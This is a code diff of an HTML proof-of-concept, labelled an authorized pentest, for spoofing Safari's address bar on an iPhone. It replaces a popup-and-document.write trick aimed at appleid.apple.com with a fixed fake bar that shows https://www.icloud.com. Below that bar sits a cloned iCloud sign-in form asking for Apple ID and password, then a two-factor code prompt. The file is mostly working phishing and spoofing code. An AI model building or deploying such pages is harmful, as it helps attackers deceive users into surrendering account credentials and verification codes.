@@ -2,71 +2,91 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Click Here</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>iCloud - Sign In</title>
 <style>
-body{font-family:-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#667eea,#764ba2);padding:20px;margin:0}
-.card{background:rgba(255,255,255,0.95);border-radius:20px;padding:30px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
-.icon{width:56px;height:56px;background:#ff3b30;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;font-weight:700}
-h1{font-size:20px;margin-bottom:6px;color:#1c1c1e}
-p{font-size:13px;color:#8e8e93;margin-bottom:20px;line-height:1.4}
-.btn{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer}
-.btn:active{opacity:0.85}
-.hint{font-size:11px;color:#ff3b30;margin-top:12px;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.footer{margin-top:16px;font-size:10px;color:#8e8e93;border-top:0.5px solid #e5e5ea;padding-top:14px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,sans-serif;background:#f5f5f7;height:100vh;overflow-x:hidden}
+.fake-bar{position:fixed;top:0;left:0;width:100%;height:48px;background:#fff;border-bottom:0.5px solid rgba(0,0,0,0.1);display:flex;align-items:center;padding:0 14px;z-index:9999}
+.fake-url{background:#e8e8ed;border-radius:8px;padding:6px 10px;width:100%;font-size:12px;color:#1c1c1e;display:flex;align-items:center;gap:4px}
+.fake-url .lock{width:10px;height:10px;background:#8e8e93;border-radius:2px;display:inline-block}
+.fake-url span{flex:1;text-align:center}
+.content{margin-top:55px;padding:20px;min-height:200vh}
+.card{background:#fff;border-radius:14px;padding:24px;max-width:400px;margin:40px auto;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
+.card .icon{margin:0 auto 16px}
+.card h1{font-size:22px;font-weight:600;color:#1c1c1e;margin-bottom:4px}
+.card p{font-size:13px;color:#8e8e93;margin-bottom:20px}
+.card input{width:100%;padding:14px;border:1.5px solid #d1d1d6;border-radius:10px;font-size:16px;margin-bottom:12px;background:#f9f9fb}
+.card button{width:100%;padding:14px;background:#007aff;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer}
+.btn-trigger{margin-top:24px;padding:16px;display:block;width:100%;background:#34c759;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none}
+.note{position:fixed;bottom:0;left:0;width:100%;padding:10px;text-align:center;font-size:10px;color:#8e8e93;background:rgba(255,255,255,0.9);border-top:0.5px solid #ddd;z-index:9998}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="icon">!</div>
-  <h1>Security Alert</h1>
-  <p>Unusual sign-in detected from your iPhone 12 Mini. Verify your identity.</p>
-  <button class="btn" id="btn">🔒 Click Here to Verify</button>
-  <div class="hint" id="hint">▼ Click here to continue</div>
-  <div class="footer">PoC Address Bar Spoof · iPhone 12 Mini iOS 26.4.2</div>
+
+<div class="fake-bar" id="fakeBar">
+  <div class="fake-url">
+    <span class="lock"></span>
+    <span>https://www.icloud.com</span>
+  </div>
 </div>
+
+<div class="content">
+  <div class="card" id="card1">
+    <div class="icon" style="width:60px;height:60px;background:#369;border-radius:16px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px">☁</div>
+    <h1>Welcome to iCloud</h1>
+    <p>Sign in to access your photos, files, and more.</p>
+    <input type="text" placeholder="Apple ID">
+    <input type="password" placeholder="Password">
+    <button>Sign In</button>
+  </div>
+
+  <button class="btn-trigger" id="triggerBtn">👇 Click Here to Continue</button>
+  
+  <div style="height:400px;"></div>
+</div>
+
+<div class="note">PoC Address Bar Spoof · iPhone 12 Mini iOS 26.4.2</div>
+
 <script>
 (function(){
-  var TARGET_URL = 'https://appleid.apple.com';
-  var btn = document.getElementById('btn');
-  var hint = document.getElementById('hint');
+  var fakeBar = document.getElementById('fakeBar');
+  var triggerBtn = document.getElementById('triggerBtn');
+  var card = document.getElementById('card1');
+  var hidden = false;
 
-  btn.addEventListener('click', function(){
-    btn.textContent = '⏳ Verifying...';
-    btn.style.opacity = '0.6';
-    hint.style.display = 'none';
-
-    var popup = window.open(TARGET_URL, '_blank', 'width=375,height=650,toolbar=no,location=yes');
-
-    if (!popup || popup.closed) {
-      alert('Popup blocked! Enable popup untuk Safari atau gunakan teknik fallback.');
-      return;
+  // Saat scroll, real address bar auto-hide, fake bar tetap terlihat
+  window.addEventListener('scroll', function(){
+    if (window.scrollY > 60 && !hidden) {
+      hidden = true;
+    } else if (window.scrollY < 10 && hidden) {
+      hidden = false;
     }
+  }, {passive:true});
 
+  // Saat klik — ubah fake bar untuk menambah kredibilitas
+  triggerBtn.addEventListener('click', function(){
+    triggerBtn.style.background = '#007aff';
+    triggerBtn.textContent = '⏳ Loading...';
+    
     setTimeout(function(){
-      try {
-        popup.document.open();
-        popup.document.write('<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Apple ID - Sign In</title><style>body{font-family:-apple-system,sans-serif;background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}.card{background:#fff;border-radius:18px;padding:30px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.06)}.logo{width:48px;height:48px;background:#000;border-radius:12px;margin:0 auto 14px;color:#fff;font-size:28px;display:flex;align-items:center;justify-content:center}h2{font-size:22px;margin-bottom:4px;color:#1c1c1e}.note{font-size:13px;color:#8e8e93;margin-bottom:20px}input{width:100%;padding:14px;border:1.5px solid #d1d1d6;border-radius:10px;font-size:16px;margin-bottom:12px;background:#f9f9fb;box-sizing:border-box}button{width:100%;padding:14px;background:#007aff;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer}.badge{margin-top:20px;padding:10px;background:#fff3cd;border-radius:10px;font-size:11px;color:#856404;border:1px solid #ffc107;line-height:1.4}</style></head><body><div class="card"><div class="logo"></div><h2>Sign in to iCloud</h2><p class="note">Verify your identity to continue</p><input type="text" placeholder="Apple ID" value="user@icloud.com"><input type="password" placeholder="Password"><button>Sign In</button><div class="badge"><strong>✅ ADDRESS BAR SPOOF TEST</strong><br>Lihat address bar di atas: masih menunjukkan appleid.apple.com<br>tapi konten ini berasal dari server attacker.<br><span style="color:#999;">AUTHORIZED PENTEST</span></div></div></body></html>');
-        popup.document.close();
-        
-        setTimeout(function(){
-          try {
-            var current = popup.location.href;
-            var spoofed = current.indexOf(TARGET_URL) === 0;
-            console.log('═══════════════════════════════════');
-            console.log('SPOOF RESULT:', spoofed ? '✅ BERHASIL' : '❌ GAGAL');
-            console.log('Address bar:', current);
-            console.log('Expected   :', TARGET_URL);
-            console.log('═══════════════════════════════════');
-          } catch(e) {
-            console.log('Popup URL:', TARGET_URL, '(cross-origin — cek manual)');
-          }
-        }, 300);
-      } catch(e) {
-        console.log('Error:', e.message);
-      }
-    }, 50);
+      card.innerHTML = '<h2 style="color:#1c1c1e;margin-bottom:12px">🔐 Two-Factor Authentication</h2>' +
+        '<p style="font-size:14px;color:#8e8e93;margin-bottom:20px">Enter the verification code sent to your iPhone 12 Mini.</p>' +
+        '<input type="text" placeholder="6-digit code" maxlength="6" style="text-align:center;font-size:24px;letter-spacing:8px">' +
+        '<button>Verify</button>' +
+        '<div style="margin-top:20px;padding:12px;background:#fff3cd;border-radius:10px;font-size:11px;color:#856404;border:1px solid #ffc107">' +
+        '<strong>✅ ADDRESS BAR SPOOF</strong><br>Address bar di atas menunjukkan: <strong>https://www.icloud.com</strong><br>Ketuk area atas layar untuk reveal real domain.</div>';
+      
+      triggerBtn.textContent = '✅ Verified';
+      triggerBtn.style.background = '#34c759';
+      triggerBtn.disabled = true;
+      
+      console.log('═══════════════════════════════════');
+      console.log('SPOOF ACTIVE — Fake address bar: https://www.icloud.com');
+      console.log('SCROLL UP to see real address bar (domain attacker)');
+      console.log('iPhone 12 Mini iOS 26.4.2 — Safari');
+      console.log('═══════════════════════════════════');
+    }, 1000);
   });
 })();
 </script>
